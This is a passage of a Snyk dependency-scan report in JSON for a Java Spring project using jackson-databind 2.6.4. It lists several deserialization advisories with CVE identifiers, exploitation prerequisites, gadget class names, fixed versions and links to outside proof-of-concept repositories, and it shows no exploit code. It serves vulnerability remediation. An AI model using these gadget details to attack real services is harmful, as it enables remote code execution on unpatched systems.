Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.1, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2478)\n",
      "disclosureTime": "2019-10-01T17:43:33Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.1",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469676",
      "identifiers": {
        "CVE": [
          "CVE-2019-16943"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-fmmc-742q-jg75"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:58:41.186190Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-02T17:43:33Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2478"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10.1)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-07T10:05:31.629572Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered related to `net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/191a4cdf87b56d2ddddb77edd895ee756b7f75eb)\n- [GitHub Comparison](https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.3...jackson-databind-2.9.10)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2460)\n",
      "disclosureTime": "2019-10-07T01:14:26Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-471943",
      "identifiers": {
        "CVE": [
          "CVE-2019-17267"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-f3j5-rmmp-3fc5"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:54:38.066408Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-07T01:14:26Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/191a4cdf87b56d2ddddb77edd895ee756b7f75eb"
        },
        {
          "title": "GitHub Comparison",
          "url": "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.3...jackson-databind-2.9.10"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2460"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-13T07:40:03.046000Z",
      "credit": [
        "Zhangxianhui"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. When Default Typing is enabled for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.1 or higher.\n## References\n- [Blog Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/b5a304a98590b6bb766134f9261e6566dcbbb6d0)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2498)\n",
      "disclosureTime": "2019-10-12T21:52:10Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.1"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-472980",
      "identifiers": {
        "CVE": [
          "CVE-2019-17531"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-gjmw-vf9h-g25v"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:54.438902Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-13T07:41:55Z",
      "references": [
        {
          "title": "Blog Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/b5a304a98590b6bb766134f9261e6566dcbbb6d0"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2498"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0, 2.9.10.1)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-01-03T10:26:22.562970Z",
      "credit": [
        "UltramanGaia"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Two additional `net.sf.ehcache` gadgets are not blacklisted.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.2 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/fc4214a883dc087070f25da738ef0d49c2f3387e)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2526)\n",
      "disclosureTime": "2020-01-03T05:14:08Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.2"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0,2.9.10.2)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0,2.9.10.2)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-540500",
      "identifiers": {
        "CVE": [
          "CVE-2019-20330"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:57:43.185212Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-01-03T05:14:08Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/fc4214a883dc087070f25da738ef0d49c2f3387e"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2526"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.2)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-02-11T07:57:04.144993Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)). \r\nIt lacks `xbean-reflect/JNDI` blocking, as demonstrated by `org.apache.xbean.propertyeditor.JndiConverter`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.7.9.7, 2.8.11.5, 2.9.10.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2620)\n- [Jackson PoC](https://github.com/jas502n/jackson-CVE-2020-8840)\n- [PoC](https://github.com/jas502n/CVE-2020-8840)\n- [PoC](https://github.com/Veraxy01/CVE-2020-8840)\n",
      "disclosureTime": "2020-02-09T21:12:38Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.4",
        "2.7.9.7",
        "2.8.11.5",
        "2.9.10.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-548451",
      "identifiers": {
        "CVE": [
          "CVE-2020-8840"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:57:53.187233Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-02-11T21:12:38Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2620"
        },
        {
          "title": "Jackson PoC",
          "url": "https://github.com/jas502n/jackson-CVE-2020-8840"
        },
        {
          "title": "PoC",
          "url": "https://github.com/jas502n/CVE-2020-8840"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Veraxy01/CVE-2020-8840"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.7.9.7)",
          "[2.8.0,2.8.11.5)",
          "[2.9.0,2.9.10.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-02T10:29:31.222015Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Mishandles the interaction between serialization gadgets and typing, related to:\r\n\r\n* `com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig` (aka `ibatis-sqlmap`)\r\n* `br.com.anteros.dbcp.AnterosDBCPConfig` (aka `anteros-core`)\r\n* `org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig` (aka shaded `hikari-config`)\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.7.9.7, 2.8.11.6, 2.9.10.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/9f4e97019fb0dd836533d0b6198c88787e235ae2)\n- [Github Issue #1](https://github.com/FasterXML/jackson-databind/issues/2634)\n- [GitHub Issue #2](https://github.com/FasterXML/jackson-databind/issues/2631)\n- [GitHub PoC](https://github.com/fairyming/CVE-2020-9548)\n",
      "disclosureTime": "2020-03-02T05:18:36Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.4",
        "2.7.9.7",
        "2.8.11.6",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559094",
      "identifiers": {
        "CVE": [
          "CVE-2020-9546",
          "CVE-2020-9547",
          "CVE-2020-9548"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-q93h-jc49-78gg",
          "GHSA-p43x-xfjf-5jhr",
          "GHSA-5p34-5m6p-p58g"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:55:36.403633Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-02T05:18:36Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/9f4e97019fb0dd836533d0b6198c88787e235ae2"
        },
        {
          "title": "Github Issue #1",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2634"
        },
        {
          "title": "GitHub Issue #2",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2631"
        },
        {
          "title": "GitHub PoC",
          "url": "https://github.com/fairyming/CVE-2020-9548"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.7.9.7)",
          "[2.8.0,2.8.11.6)",
          "[2.9.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
